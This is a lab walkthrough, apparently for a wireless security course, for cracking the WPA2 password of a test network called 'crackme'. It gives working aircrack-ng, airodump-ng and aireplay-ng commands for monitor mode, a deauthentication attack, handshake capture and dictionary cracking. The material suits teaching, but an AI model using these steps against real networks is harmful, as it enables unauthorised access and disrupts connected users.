# Complete Guide to WPA2 Attack for Wireless Security Lab

This guide provides a detailed operational path to crack the password of the WPA2 network named "crackme", going through traffic interception and EAPOL protocol analysis.

## 🎯 Objective
The goal of the lab is to obtain the password of a secured network by capturing the 4-way handshake during an authentication phase and applying a dictionary-based brute-force attack.

## 📋 Prerequisites
To successfully complete the laboratory, you need to have the following setup:

- A laptop with a WiFi card supporting **Monitor Mode** and **Packet Injection**.
- A Linux operating system (Kali Linux recommended) or macOS.
- `aircrack-ng` suite and `wireshark` software installed on the system.

---

## 🔍 PHASE 1: Network Reconnaissance

The first step consists of identifying the target's technical coordinates within the radio spectrum.

- Identify the interface name (e.g., `wlan0` or `wlp2s0`) using the `iw dev` or `ip link show` command.
- Start a scan to find the "crackme" network and write down the **BSSID** (MAC address of the Access Point) and the **Channel** (CH).

```bash
sudo iw dev wlan0 scan | grep -E "SSID|freq|BSS"
```

---

## 📡 PHASE 2: Enable Monitor Mode

To capture packets not directly destined for our device, we must change how the WiFi card operates.
- `sudo airmon-ng check wlan0`
- Kill system processes that might interfere with the aircrack suite: `sudo airmon-ng check kill`.
- Enable monitor mode: `sudo airmon-ng start wlan0`.
- Verify that the interface is now renamed to `wlan0mon` and check its status using `iw dev`.

---

## 🎯 PHASE 3: Target Identification

Using `airodump-ng`, observe the traffic on the specific channel to identify clients connected to the target Access Point.

```bash
sudo airodump-ng -c 6 wlan0mon
```

- **BSSID**: Physical address of the Access Point.
- **STATION**: MAC address of the currently connected client, necessary to force re-authentication.

---

## 💾 PHASE 4: 4-way Handshake Capture

This is the most critical phase: we need to capture the key exchange between the client and the AP.

### Step 4.1: Targeted capture start
Leave this command running in a terminal to write data to a file:
```bash
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w crackme wlan0mon
```

### Step 4.2: Deauthentication Attack
In a new terminal, send deauthentication packets to force the client to reconnect:
```bash
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
```

### Step 4.3: Verification
Check that the top right corner of the first terminal displays the following text: `[ WPA handshake: AA:BB:CC:DD:EE:FF ]`.

---

## 🔐 PHASE 5: Password Cracking

Once the capture file (`.cap`) is obtained, proceed with the offline attack.

- Prepare the wordlist (if using a CSV, extract the password column).
- Launch the crack:
```bash
sudo aircrack-ng -a2 -b AA:BB:CC:DD:EE:FF -w wordlist.txt crackme-01.cap
```
- If the password is in the dictionary, the tool will return: `KEY FOUND! [ password123 ]`.
